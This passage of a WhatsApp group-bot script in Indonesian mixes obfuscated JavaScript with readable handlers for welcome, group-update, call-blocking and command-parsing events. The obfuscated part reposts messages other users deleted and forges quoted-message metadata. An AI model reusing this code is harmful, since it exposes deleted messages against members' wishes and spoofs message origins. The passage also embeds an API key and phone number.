zacky[_0x7517b7(0x217)](_0x5e2bd1[_0x7517b7(0x1d4)]);num=_0x5e2bd1[_0x7517b7(0x208)][0x0],anu_user=zacky[_0x7517b7(0x1f1)][mem],memeg=_0x3dbe30[_0x7517b7(0x208)][_0x7517b7(0x1f6)];try{ppimg=await zacky[_0x7517b7(0x1b6)](_0x5e2bd1['participants'][0x0][_0x7517b7(0x1c5)]('@')[0x0]+_0x7517b7(0x1cf));}catch{ppimg=_0x7517b7(0x1e9);}let _0x34b9c3=await getBuffer(ppimg);teks=_0x7517b7(0x1c7)+num['split']('@')[0x0]+_0x7517b7(0x1f7)+anu_user['notify']+_0x7517b7(0x1c9)+tampilTanggal+_0x7517b7(0x207)+_0x3dbe30[_0x7517b7(0x209)]+'\x0a║┣❥\x20*kasihaan\x20di\x20demote🤣*\x0a╚════\x20⸨\x20*'+NamaBot+_0x7517b7(0x1ce),zacky[_0x7517b7(0x1ba)](_0x3dbe30['id'],_0x34b9c3,MessageType[_0x7517b7(0x1d1)],{'caption':teks,'contextInfo':{'mentionedJid':[num]},'quoted':{'key':{'participant':''+numbernye,'remoteJid':_0x7517b7(0x20c),'fromMe':![],'id':'B391837A58338BA8186C47E51FFDFD4A'},'message':{'documentMessage':{'jpegThumbnail':_0x34b9c3,'mimetype':_0x7517b7(0x1df),'title':'PROMOTE','fileLength':'36','pageCount':0x0,'fileName':_0x7517b7(0x1c2)}},'messageTimestamp':_0x7517b7(0x1de),'status':_0x7517b7(0x1d7)}});}}}}catch(_0x3b2088){console[_0x7517b7(0x1e4)](_0x7517b7(0x1fe),color(e,'red'));}}),(unvoke=!![],unvokeMe=![]));function _0x1950(_0x440753,_0x35eba9){_0x440753=_0x440753-0x1b4;let _0x26a1ff=_0x26a1[_0x440753];return _0x26a1ff;}if(!Array['isArray'](zacky[_0x2c68d7(0x1d8)]['CB:action,add:relay,message']))zacky[_0x2c68d7(0x1d8)][_0x2c68d7(0x1d9)]=[zacky[_0x2c68d7(0x1d8)][_0x2c68d7(0x1d9)]];else zacky['_events'][_0x2c68d7(0x1d9)]=[zacky['_events'][_0x2c68d7(0x1d9)][_0x2c68d7(0x215)]()];zacky[_0x2c68d7(0x1d8)][_0x2c68d7(0x1d9)][_0x2c68d7(0x1d5)](async _0x5d09c2=>{const _0x4e1c06=_0x2c68d7;try{if(!unvoke)return;let _0x107e98=_0x5d09c2[0x2][0x0][0x2];if(_0x107e98['message']&&_0x107e98['message'][_0x4e1c06(0x1e1)]&&_0x107e98[_0x4e1c06(0x1e3)][_0x4e1c06(0x1e1)]['type']==0x0){let _0x5c93fd=_0x107e98[_0x4e1c06(0x1e3)][_0x4e1c06(0x1e1)][_0x4e1c06(0x1dc)];if(_0x5c93fd[_0x4e1c06(0x1cc)]&&!unvokeMe)return;let _0x42d3d1=zacky[_0x4e1c06(0x1db)][_0x4e1c06(0x1be)](_0x5c93fd[_0x4e1c06(0x1e6)]),_0x51b093=_0x42d3d1[_0x4e1c06(0x205)][_0x4e1c06(0x200)][_0x5c93fd['id']+'|'+(_0x5c93fd['fromMe']?0x1:0x0)],_0x229e7f=_0x5c93fd[_0x4e1c06(0x1cc)]?zacky[_0x4e1c06(0x1b4)]['jid']:_0x51b093[_0x4e1c06(0x1dd)]?_0x51b093[_0x4e1c06(0x1dd)]:_0x5c93fd[_0x4e1c06(0x1e6)];zacky[_0x4e1c06(0x1ba)](_0x5c93fd[_0x4e1c06(0x1e6)],_0x4e1c06(0x1ed)+_0x229e7f[_0x4e1c06(0x1c5)]('@')[0x0]+_0x4e1c06(0x1f9)+tampilHari+'\x20Hari\x0a║┣❥\x20Jam\x20:\x20'+wita+'\x0a║┣❥\x20Tanggal\x20:\x20'+tampilTanggal+'\x0a╚════\x20⸨\x20*'+NamaBot+_0x4e1c06(0x1ce),MessageType[_0x4e1c06(0x1e7)],{'contextInfo':{'mentionedJid':[_0x229e7f],'quotedMessage':_0x51b093[_0x4e1c06(0x1e3)]}});let _0x1cfc83=zacky['generateForwardMessageContent'](_0x51b093,![]),_0x2f7452=Object[_0x4e1c06(0x1f4)](_0x1cfc83)[0x0],_0x562feb=Object[_0x4e1c06(0x1f4)](_0x51b093['message'])[0x0],_0x160be5={};if(_0x562feb!=MessageType[_0x4e1c06(0x1bc)])_0x160be5=_0x51b093['message'][_0x562feb]['contextInfo'];_0x1cfc83[_0x2f7452][_0x4e1c06(0x214)]={..._0x160be5,..._0x1cfc83[_0x2f7452][_0x4e1c06(0x214)]};const _0x183d97=zacky['prepareMessageFromContent'](_0x5c93fd[_0x4e1c06(0x1e6)],_0x1cfc83,{});await zacky[_0x4e1c06(0x1e5)](_0x183d97);}}catch(_0x47000b){console['log'](_0x47000b);}}),zacky['on'](_0x2c68d7(0x1eb),_0x10ff6a=>{const _0x22cece=_0x2c68d7;if(blocked[_0x22cece(0x1f6)]>0x2)return;for(let _0x516c54 of _0x10ff6a[0x1][_0x22cece(0x206)]){blocked[_0x22cece(0x218)](_0x516c54[_0x22cece(0x1c3)](_0x22cece(0x201),_0x22cece(0x1bf)));}}),zacky['on'](_0x2c68d7(0x1d6),async _0x95ba68=>{const _0x62d7f9=_0x2c68d7,_0x547d94=_0x95ba68[0x2][0x0][0x1]['from'];console['log']('call\x20dari\x20'+_0x547d94),zacky[_0x62d7f9(0x1ba)](_0x547d94,_0x62d7f9(0x1b9),MessageType[_0x62d7f9(0x1bc)]),await sleep(0xfa0),await zacky['blockUser'](_0x547d94,_0x62d7f9(0x1ea));}),zacky['on'](_0x2c68d7(0x1b7),_0x1ab36f=>{const _0x1d2e14=_0x2c68d7,_0x52f3bd=_0x1ab36f[0x2][0x0][0x1][_0x1d2e14(0x1f2)],_0x576b38=parseInt(_0x52f3bd);battre=_0x576b38,console[_0x1d2e14(0x1e4)](_0x1d2e14(0x20e)+_0x576b38+'\x20Jangan\x20Maksain\x20Yah');if(_0x576b38=='1')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x219);else{if(_0x576b38=='2')btre=_0x1d2e14(0x210)+battre+'%[█▒▒▒▒▒▒▒▒▒]';else{if(_0x576b38=='3')btre='Sisa\x20Energi:\x0a'+battre+_0x1d2e14(0x219);else{if(_0x576b38=='4')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x219);else{if(_0x576b38=='5')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x219);else{if(_0x576b38=='6')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x219);else{if(_0x576b38=='7')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x219);else{if(_0x576b38=='8')btre=_0x1d2e14(0x210)+battre+'%[█▒▒▒▒▒▒▒▒▒]';else{if(_0x576b38=='9')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x219);else{if(_0x576b38=='10')btre='Sisa\x20Energi:\x0a'+battre+'%[█▒▒▒▒▒▒▒▒▒]';else{if(_0x576b38=='11')btre=_0x1d2e14(0x1d2)+battre+_0x1d2e14(0x219);else{if(_0x576b38=='12')btre=_0x1d2e14(0x210)+battre+'%[█▒▒▒▒▒▒▒▒▒]';else{if(_0x576b38=='13')btre=_0x1d2e14(0x210)+battre+'%[█▒▒▒▒▒▒▒▒▒]';else{if(_0x576b38=='14')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x219);else{if(_0x576b38=='15')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x219);else{if(_0x576b38=='16')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x219);else{if(_0x576b38=='17')btre=_0x1d2e14(0x210)+battre+'%[█▒▒▒▒▒▒▒▒▒]';else{if(_0x576b38=='18')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x219);else{if(_0x576b38=='19')btre='Sisa\x20Energi:\x0a'+battre+_0x1d2e14(0x219);else{if(_0x576b38=='20')btre='Sisa\x20Energi:\x0a'+battre+_0x1d2e14(0x1ef);else{if(_0x576b38=='21')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1ef);else{if(_0x576b38=='22')btre='Energi\x20Penuh:\x0a'+battre+_0x1d2e14(0x1ef);else{if(_0x576b38=='23')btre='Sisa\x20Energi:\x0a'+battre+'%[██▒▒▒▒▒▒▒▒]';else{if(_0x576b38=='24')btre='Sisa\x20Energi:\x0a'+battre+_0x1d2e14(0x1ef);else{if(_0x576b38=='25')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1ef);else{if(_0x576b38=='26')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1ef);else{if(_0x576b38=='27')btre='Sisa\x20Energi:\x0a'+battre+_0x1d2e14(0x1ef);else{if(_0x576b38=='28')btre='Sisa\x20Energi:\x0a'+battre+_0x1d2e14(0x1ef);else{if(_0x576b38=='29')btre=_0x1d2e14(0x210)+battre+'%[██▒▒▒▒▒▒▒▒]';else{if(_0x576b38=='30')btre='Sisa\x20Energi:\x0a'+battre+'%[███▒▒▒▒▒▒▒]';else{if(_0x576b38=='31')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1c0);else{if(_0x576b38=='32')btre=_0x1d2e14(0x1d2)+battre+_0x1d2e14(0x1c0);else{if(_0x576b38=='33')btre='Sisa\x20Energi:\x0a'+battre+_0x1d2e14(0x1c0);else{if(_0x576b38=='34')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1c0);else{if(_0x576b38=='35')btre='Sisa\x20Energi:\x0a'+battre+_0x1d2e14(0x1c0);else{if(_0x576b38=='36')btre='Sisa\x20Energi:\x0a'+battre+_0x1d2e14(0x1c0);else{if(_0x576b38=='37')btre=_0x1d2e14(0x210)+battre+'%[███▒▒▒▒▒▒▒]';else{if(_0x576b38=='38')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1c0);else{if(_0x576b38=='39')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1c0);else{if(_0x576b38=='40')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1b8);else{if(_0x576b38=='41')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1b8);else{if(_0x576b38=='42')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1b8);else{if(_0x576b38=='43')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1b8);else{if(_0x576b38=='44')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1b8);else{if(_0x576b38=='45')btre='Sisa\x20Energi:\x0a'+battre+'%[████▒▒▒▒▒▒]';else{if(_0x576b38=='46')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1b8);else{if(_0x576b38=='46')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1b8);else{if(_0x576b38=='48')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1b8);else{if(_0x576b38=='49')btre='Sisa\x20Energi:\x0a'+battre+_0x1d2e14(0x1b8);else{if(_0x576b38=='50')btre=_0x1d2e14(0x1d2)+battre+_0x1d2e14(0x216);else{if(_0x576b38=='51')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x216);else{if(_0x576b38=='52')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x216);else{if(_0x576b38=='53')btre='Sisa\x20Energi:\x0a'+battre+_0x1d2e14(0x216);else{if(_0x576b38=='54')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x216);else{if(_0x576b38=='55')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x216);else{if(_0x576b38=='56')btre='Sisa\x20Energi:\x0a'+battre+_0x1d2e14(0x216);else{if(_0x576b38=='57')btre='Sisa\x20Energi:\x0a'+battre+'%[█████▒▒▒▒▒]';else{if(_0x576b38=='58')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x216);else{if(_0x576b38=='59')btre='Sisa\x20Energi:\x0a'+battre+'%[█████▒▒▒▒▒]';else{if(_0x576b38=='60')btre=_0x1d2e14(0x210)+battre+'%[██████▒▒▒▒]';else{if(_0x576b38=='61')btre=_0x1d2e14(0x1d2)+battre+_0x1d2e14(0x1cd);else{if(_0x576b38=='62')btre='Sisa\x20Energi:\x0a'+battre+_0x1d2e14(0x1cd);else{if(_0x576b38=='63')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1cd);else{if(_0x576b38=='64')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1cd);else{if(_0x576b38=='65')btre='Sisa\x20Energi:\x0a'+battre+_0x1d2e14(0x1cd);else{if(_0x576b38=='66')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1cd);else{if(_0x576b38=='67')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1cd);else{if(_0x576b38=='68')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1cd);else{if(_0x576b38=='69')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1cd);else{if(_0x576b38=='70')btre='Sisa\x20Energi:\x0a'+battre+_0x1d2e14(0x1c1);else{if(_0x576b38=='71')btre='Energi\x20Penuh:\x0a'+battre+_0x1d2e14(0x1c1);else{if(_0x576b38=='72')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1c1);else{if(_0x576b38=='73')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1c1);else{if(_0x576b38=='74')btre='Sisa\x20Energi:\x0a'+battre+_0x1d2e14(0x1c1);else{if(_0x576b38=='75')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1c1);else{if(_0x576b38=='76')btre='Sisa\x20Energi:\x0a'+battre+_0x1d2e14(0x1c1);else{if(_0x576b38=='77')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1c1);else{if(_0x576b38=='78')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1c1);else{if(_0x576b38=='79')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1c1);else{if(_0x576b38=='80')btre=_0x1d2e14(0x210)+battre+'%[████████▒▒]';else{if(_0x576b38=='81')btre=_0x1d2e14(0x210)+battre+'%[████████▒▒]';else{if(_0x576b38=='82')btre=_0x1d2e14(0x1d2)+battre+'%[████████▒▒]';else{if(_0x576b38=='83')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1bb);else{if(_0x576b38=='84')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1bb);else{if(_0x576b38=='85')btre='Sisa\x20Energi:\x0a'+battre+_0x1d2e14(0x1bb);else{if(_0x576b38=='85')btre=_0x1d2e14(0x210)+battre+'%[████████▒▒]';else{if(_0x576b38=='87')btre='Sisa\x20Energi:\x0a'+battre+_0x1d2e14(0x1bb);else{if(_0x576b38=='88')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1bb);else{if(_0x576b38=='89')btre='Sisa\x20Energi:\x0a'+battre+'%[████████▒▒]';else{if(_0x576b38=='90')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1bb);else{if(_0x576b38=='91')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1e0);else{if(_0x576b38=='92')btre=_0x1d2e14(0x1d2)+battre+_0x1d2e14(0x1e0);else{if(_0x576b38=='93')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1e0);else{if(_0x576b38=='94')btre=_0x1d2e14(0x210)+battre+'%[█████████▒]';else{if(_0x576b38=='95')btre='Sisa\x20Energi:\x0a'+battre+_0x1d2e14(0x1e0);else{if(_0x576b38=='96')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1e0);else{if(_0x576b38=='97')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1e0);else{if(_0x576b38=='98')btre='Sisa\x20Energi:\x0a'+battre+_0x1d2e14(0x1e0);else{if(_0x576b38=='99')btre=_0x1d2e14(0x210)+battre+_0x1d2e14(0x1e0);else _0x576b38==_0x1d2e14(0x1fc)&&(btre=_0x1d2e14(0x210)+battre+'%[██████████]');}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}_0x576b38=='50'&&console[_0x1d2e14(0x1e4)]('Jangan\x20Memaksakan\x20Yah,\x20Lihat\x20Battery\x20Mu!?');});

/********** WELCOME **********/
zacky.on('group-participants-update', async (anu) => {
		if (!welkom.includes(anu.jid)) return
		try {
			const mdata = await zacky.groupMetadata(anu.jid)
			const mdesc = isGroup ? mdata.desc : ''
		 num = anu.participants[0]
         console.log(anu)
         member = mdata.participants.length
                   
            if (anu.action == 'add') {
teks = `❰ 「 *JOIN* 」 ❱

Hai, @${num.split('@')[0]}
Selamat datang di *${mdata.subject}*

${mdesc}`
zacky.sendMessage(mdata.id, teks, text, {quoted: fwelcome, contextInfo: {'mentionedJid': [num], forwardingScore: 1000, isForwarded: true, externalAdReply: { title: `Welcome To ${mdata.subject}`, thumbnail: fpp, mediaType: 2, previewType: "VIDEO", mediaUrl: "https://youtu.be/7eZKvZmyENc"}}})
            } else if (anu.action == 'remove') {
teks = `❰ 「 *LEAVE* 」 ❱

Selamat tinggal @${num.split('@')[0]}
*Waktu :* ${time}`
zacky.sendMessage(mdata.id, teks, text, {quoted: fwelcome, contextInfo: {'mentionedJid': [num], forwardingScore: 1000, isForwarded: true, externalAdReply: { title: `Keluar Dari ${mdata.subject}`, thumbnail: fpp, mediaType: 2, previewType: "VIDEO", mediaUrl: "https://youtu.be/7eZKvZmyENc"}}})
            } else if (anu.action == 'promote') {
teks = `╔═══ ❰ 「 *PROMOTED* 」 ❱ ════
║┣❥ *Nama :* @${num.split('@')[0]}
║┣❥ *Waktu :* ${time}
║┣❥ *Group :* ${mdata.subject}
╚═══ ❰ 「 *${NamaBot}* 」 ❱ ════`
zacky.sendMessage(mdata.id, teks, text, {quoted: fwelcome, contextInfo: {'mentionedJid': [num], forwardingScore: 1000, isForwarded: true, externalAdReply: { title: `Promoted Di ${mdata.subject}`, thumbnail: fpp, mediaType: 2, previewType: "VIDEO", mediaUrl: "https://youtu.be/7eZKvZmyENc"}}})
            } else if (anu.action == 'demote') {
teks = `╔═══ ❰ 「 *DEMOTED* 」 ❱ ════
║┣❥ *Nama :* @${num.split('@')[0]}
║┣❥ *Waktu :* ${time}
║┣❥ *Group :* ${mdata.subject}
╚═══ ❰ 「 *${NamaBot}* 」 ❱ ════`
zacky.sendMessage(mdata.id, teks, text, {quoted: fwelcome, contextInfo: {'mentionedJid': [num], forwardingScore: 1000, isForwarded: true, externalAdReply: { title: `Demoted Di ${mdata.subject}`, thumbnail: fpp, mediaType: 2, previewType: "VIDEO", mediaUrl: "https://youtu.be/7eZKvZmyENc"}}})
            }            
		} catch (e) {
			console.log('Error : %s', color(e, 'red'))
		}
	})			 			 			 	
	
zacky.on('group-update', async (anu) => {
		if (!welkom.includes(anu.jid)) return
		const metdata = await zacky.groupMetadata(anu.jid)
		
    if(anu.announce == 'false'){
    teks = `❰ 「 *GROUP OPENED* 」 ❱\n\n_Group telah dibuka oleh admin_\n_Sekarang semua member bisa mengirim pesan_`
    zacky.sendMessage(metdata.id, teks, MessageType.text, {quoted: fwelcome, contextInfo: {forwardingScore: 1000, isForwarded: true, externalAdReply: { title: `GROUP DI BUKA`, thumbnail: fpp, mediaType: 2, previewType: "VIDEO", mediaUrl: "https://youtu.be/7eZKvZmyENc"}}})
    console.log(color('|INFO|'), color(`Group Opened In ${metdata.subject}`, 'cyan'))
  }
  else if(anu.announce == 'true'){
    teks = `❰ 「 *GROUP CLOSED* 」 ❱\n\n_Group telah ditutup oleh admin_\n_Sekarang hanya admin yang dapat mengirim pesan_`
    zacky.sendMessage(metdata.id, teks, MessageType.text, {quoted: fwelcome, contextInfo: {forwardingScore: 1000, isForwarded: true, externalAdReply: { title: `GROUP DI TUTUP`, thumbnail: fpp, mediaType: 2, previewType: "VIDEO", mediaUrl: "https://youtu.be/7eZKvZmyENc"}}})
    console.log(color('|INFO|'), color(`Group Closed In ${metdata.subject}`,  'cyan'))
  }
  else if(!anu.desc == ''){
    tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
    teks = `❰ 「 *GROUP DESCRIPTION CHANGE* 」 ❱\n\nDeskripsi Group telah diubah oleh Admin @${anu.descOwner.split('@')[0]}\n\n• Deskripsi Baru :\n${anu.desc}`
    zacky.sendMessage(metdata.id, teks, MessageType.text, {quoted: fwelcome, contextInfo: {'mentionedJid': [tag], forwardingScore: 1000, isForwarded: true, externalAdReply: { title: `DESKRIPSI GROUP DIUBAH`, thumbnail: fpp, mediaType: 2, previewType: "VIDEO", mediaUrl: "https://youtu.be/7eZKvZmyENc"}}})
    console.log(color('|INFO|'), color(`Group Description Change In ${metdata.subject}`, 'cyan'))
  }
  else if(anu.restrict == 'false'){
    teks = `❰ 「 *GROUP SETTING CHANGE* 」 ❱\n\nEdit Group info telah dibuka untuk member\nSekarang semua member dapat mengedit info Group Ini`
    zacky.sendMessage(metdata.id, teks, MessageType.text, {quoted: fwelcome, contextInfo: {forwardingScore: 1000, isForwarded: true, externalAdReply: { title: `GROUP SETTING DIUBAH`, thumbnail: fpp, mediaType: 2, previewType: "VIDEO", mediaUrl: "https://youtu.be/7eZKvZmyENc"}}})
    console.log(color('|INFO|'), color(`Group Setting Change In ${metdata.subject}`, 'cyan'))
  }
  else if(anu.restrict == 'true'){
    teks = `❰ 「 *GROUP SETTING CHANGE* 」 ❱\n\nEdit Group info telah ditutup untuk member\nSekarang hanya admin group yang dapat mengedit info Group Ini`
    zacky.sendMessage(metdata.id, teks, MessageType.text, {quoted: fwelcome, contextInfo: {forwardingScore: 1000, isForwarded: true, externalAdReply: { title: `GROUP SETTING DIUBAH`, thumbnail: fpp, mediaType: 2, previewType: "VIDEO", mediaUrl: "https://youtu.be/7eZKvZmyENc"}}})
    console.log(color('|INFO|'), color(`Group Setting Change In ${metdata.subject}`,  'cyan'))
  }
})
			 			 			 			 			 			 			 			 			 			 			 			 
/*====================================================[ CHAT UPDATE ]==============================================================*/			                    	                     	 			                    	                     	 

zacky.on("CB:Call", json => {
		let call;
		calling = JSON.parse(JSON.stringify(json))
		call = calling[1].from		
		console.log(color("〆〔 CALL 〕", "red"), time, "from", color(sender.split("@")[0], "aqua"))		
		zacky.blockUser(call, "add")					
 		})	 
 				
zacky.on('CB:action,,battery', json => {
        const battery = json[2][0][1].value
	    const persenbat = parseInt(battery)
	    battre = `${persenbat}%`
	    if(json[2][0][1].live == 'true') {
        charging = true
            }else if (json[2][0][1].live == 'false') {
            charging = false
            }
            const Chargi = json[2][0][1].live
            Charge = Chargi
        })
 		
 		module.exports = async (zacky, mek) => {
	        try {
            if (!mek.hasNewMessage) return
            mek = mek.messages.all()[0]
            if (!mek.message) return
	        mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
			if (!mek.message) return
			if (mek.key && mek.key.remoteJid == 'status@broadcast') return	
			m = simple.smsg(zacky, mek)
			let { mentioned } = m
		    bail = m.isBaileys		
		    global.prefix
			global.blocked			
			me = zacky.user
			const content = JSON.stringify(mek.message)
			const from = mek.key.remoteJid
			const type = Object.keys(mek.message)[0]
			time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
			ramadhann = ('https://xinzbot-api.herokuapp.com/api/hitungmundur?apikey=XinzBot&tanggal=1&bulan=4')						
			const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()            
			const linkRegex = /(a(su|nj(([ie])ng|([ie])r)?)|me?me?k|ko?nto?l|ba?bi|fu?ck|ta(e|i)k|bangsat|g([iueo])bl([iueo])(k|g)|g ([iueo]) b l ([iueo]) (k|g)|a (n j (i n g|i r)?)s u|col(i|ay)|an?jg|b([ia])ngs([ia])?t|t([iuo])l([iuo])l)/i                       
			prefix = /^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+@,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+,;]/gi) : `${prefix}`
			body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'videoMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'extendedTextMessage') && mek.message[type].text.startsWith(prefix) ? mek.message[type].text : (type == 'listResponseMessage') && mek.message[type].singleSelectReply.selectedRowId ? mek.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : ''
		    budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
			const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
			var tas = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''			
			const mesejAnti = tas.slice(0).trim().split(/ +/).shift().toLowerCase()			
			RAM = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`			
			const args = body.trim().split(/ +/).slice(1)
			const isCmd = body.startsWith(prefix)
			const quoted = mek.quoted ? mek.quoted : mek
			mess = {	
			wait: '*「 ⏱️ 」Sedang di proses...*',
			asik: '*「 ⌛ 」Sedang di proses...*\nsilahkan tunggu ± 1 min! Jika Tidak Muncul\nKemungkinan ERROR.',
			success: '*「 ☑️ 」Berhasil!*',
			levelon: '*「 ☑️ 」Sukses Mengaktifkan Fitur Leveling!*',
			leveloff: '*「 ☑️ 」Sukses Menonaktifkan Fitur Leveling!*',
			levelnoton: '*「 ❗ 」Fitur Leveling Tidak Aktif, Segera Hubungi Owner Untuk Mengaktifkan Fitur Tersebut.*   \n\n*Nomor owner https://wa.me/6281375026190*',
			levelnol: '*LEVEL KAKAK KOK MASIH* 0 >_<',
			},
			error = {
			stick: '*「 ❌ 」Gagal, terjadi kesalahan saat mengkonversi gambar ke sticker.*',
			Iv: '*「 ❌ 」Link yang anda kirim tidak valid.*',
			api: `*「 ❌ 」Error*`,
			},
			only = {
			group: '*「 ❗ 」Perintah ini hanya bisa di gunakan dalam group.*',
			premium: '*「 ❗ 」Fitur Ini Hanya Untuk Penggunaan Premium.*',
			mod: '*「 ❗ 」Fitur Ini Hanya Untuk Penggunaan Mods ManikBot',
			benned: `*「 USER BANNED DETECTED 」* \nAnda Ke Band Silahkan Hubungi Owner Agar Membuka Band Anda`,
			ownerG: '*「 ❗ 」Fitur Ini Khusus Owner.*',
			ownerB: '*「 ❗ 」Fitur Ini Khusus Owner.*',
			daftarB: `*「 NOT REGISTERED DETECTED 」* \nHalo Human, Yuk Daftar Dulu Soalnya Anda Belum Terdaftar Dalam Database ManikBot\n\n *──Segera Registrasi Data Diri Anda──* \n\nKetik : ${prefix}register nama|umur\nContoh : ${prefix}register Manik|16`,
			admin: '*「 ❗ 」*  Perintah ini hanya bisa di gunakan oleh admin group.',
			Badmin: ' *「 ❗ 」*  Perintah ini hanya bisa di gunakan ketika bot menjadi admin.',
			publikG: '*Fitur Dalam Private Harap Menunggu Owner Mempublikasikannya!*',
			donator: '*Fitur ini khusus donator*',
			Theif: '*Maaf Sidik Wajah Anda Tidak Terdaftar di dalam Database Bot*',
			}										
			const botNumber = zacky.user.jid
			const ownerNumber = [`${manikganz.ownerNumber}@s.whatsapp.net`] // replace this with your number
			isGroup = from.endsWith('@g.us')
		    sender = mek.key.fromMe ? zacky.user.jid : isGroup ? mek.participant : mek.key.remoteJid
			const conts = mek.key.fromMe ? zacky.user.jid : zacky.contacts[sender] || { notify: jid.replace(/@.+/, '') }
            pushname = mek.key.fromMe ? zacky.user.name : conts.notify || conts.vname || conts.name || '-'
			const senderNumber = sender.split("@")[0] 			
            hitt.push(command)
            const q = args.join(' ')
            const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model, device_network, device_cpu, battery_level, device_ram } = zacky.user.phone
            const hour_now = moment().format('HH:mm:ss')
            uptime = process.uptime()
            runtime = kyun(uptime)
            isRegistered = checkRegisteredUser (sender)
			const isAfkOn = off.checkAfkUser(sender, _off)
			const mentionByTag = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.mentionedJid : []
            const mentionByReply = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.participant || "" : ""
            const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
            mention != undefined ? mention.push(mentionByReply) : []
            const mentionUser = mention != undefined ? mention.filter(n => n) : []
			const groupMetadata = isGroup ? await zacky.groupMetadata(from) : ''
			const groupName = isGroup ? groupMetadata.subject : ''
			const groupId = isGroup ? groupMetadata.jid : ''
			const groupMembers = isGroup ? groupMetadata.participants : ''
			const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''		
			const groupDesc = isGroup ? groupMetadata.desc : ''		
			const groupOwner = isGroup ? groupMetadata.owner : ''	
			const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
			const isGroupAdmins = groupAdmins.includes(sender) || false
			const isWelkom = isGroup ? welkom.includes(from) : false
			const isNsfw = isGroup ? nsfw.includes(from) : false
